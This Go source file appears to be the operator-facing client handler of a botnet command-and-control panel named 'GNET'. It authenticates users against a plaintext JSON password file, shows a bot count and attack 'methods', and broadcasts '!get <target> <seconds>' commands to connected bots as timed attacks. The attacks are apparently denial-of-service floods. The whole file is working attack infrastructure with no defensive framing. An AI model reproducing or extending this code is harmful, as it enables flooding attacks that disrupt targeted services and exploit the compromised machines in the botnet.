package client

import (
	"bufio"
	"encoding/json"
	"gnet/art"
	"gnet/bot"
	"gnet/cmds"
	"net"
	"os"
	"strconv"
	"strings"
	"sync"
)

type Client struct {
	User string
	Conn net.Conn
	Addr string
}

type User struct {
	User string `json:"user"`
	Pass string `json:"pass"`
}

var (
	Clients   = make(map[net.Conn]Client)
	ClientsMu sync.RWMutex
)

func WriterBanner(Writer *bufio.Writer) {
	Scanner := bufio.NewScanner(strings.NewReader(art.BANNER))
	for Scanner.Scan() {
		Writer.WriteString("\r\033[35m" + Scanner.Text() + "\r\n\033[0m")
	}
	Writer.WriteString("\r\n")
	Writer.Flush()
}

func GetClientByConnection(Connection net.Conn) (Client, bool) {
	ClientsMu.RLock()
	defer ClientsMu.RUnlock()
	Client, ok := Clients[Connection]
	return Client, ok
}

func RemoveClient(Connection net.Conn) {
	ClientsMu.Lock()
	delete(Clients, Connection)
	ClientsMu.Unlock()
}

func ClientHandler(Connection net.Conn) {
	defer Connection.Close()
	defer RemoveClient(Connection)

	Reader := bufio.NewScanner(Connection)
	Writer := bufio.NewWriter(Connection)

	Writer.WriteString("\033[2J\033[H")
	WriterBanner(Writer)
	Writer.WriteString("\033[35mlogin (user:pass)\033[0m\r\n> ")
	Writer.Flush()

	if !Reader.Scan() {
		return
	}

	Parts := strings.Split(strings.TrimSpace(Reader.Text()), ":")
	if len(Parts) != 2 {
		return
	}

	Content, err := os.ReadFile("./data/users.json")
	if err != nil {
		return
	}

	var Accounts []User
	if json.Unmarshal(Content, &Accounts) != nil {
		return
	}

	Username := Parts[0]
	Password := Parts[1]
	Valid := false

	for _, Acc := range Accounts {
		if Acc.User == Username && Acc.Pass == Password {
			Valid = true
			break
		}
	}

	if !Valid {
		return
	}

	ClientsMu.Lock()
	Clients[Connection] = Client{
		User: Username,
		Conn: Connection,
		Addr: Connection.RemoteAddr().String(),
	}
	ClientsMu.Unlock()

	Output := ""

	for {
		Writer.WriteString("\033[2J\033[H")
		WriterBanner(Writer)
		Writer.WriteString("\033[35m| GNET V1.0.0 | .help |\033[0m\r\n")
		if Output != "" {
      Scanner := bufio.NewScanner(strings.NewReader(Output))
    	for Scanner.Scan() {
    		Writer.WriteString("\r\033[35m" + Scanner.Text() + "\r\n\033[0m")
    	}
    	Writer.WriteString("\r\n")
    	Writer.Flush()
		}
		Writer.WriteString("\033[35m" + Username + "> \033[0m")
		Writer.Flush()

		if !Reader.Scan() {
			return
		}

		Command := strings.TrimSpace(Reader.Text())
		Output = ""

		switch Command {
		case ".help":
			Output = cmds.Help()
		case ".methods":
			Output = cmds.Methods()
		case ".bots":
			Output = "[GNET] - " + strconv.Itoa(bot.GetBots()) + " bots"
		case ".clear":
			Output = ""
			continue
		}

		Parts := strings.Split(Command, " ")
		if len(Parts) == 3 && Parts[0] == "!get" {
			Seconds, err := strconv.Atoi(Parts[2])
			if err == nil {
				go bot.SendCommandToBots(Command)
				Output = "[GNET] - " + Parts[1] + " " + strconv.Itoa(Seconds) + " seconds ATK offloaded to " + strconv.Itoa(bot.GetBots()) + " bots"
			}
		}
	}
}
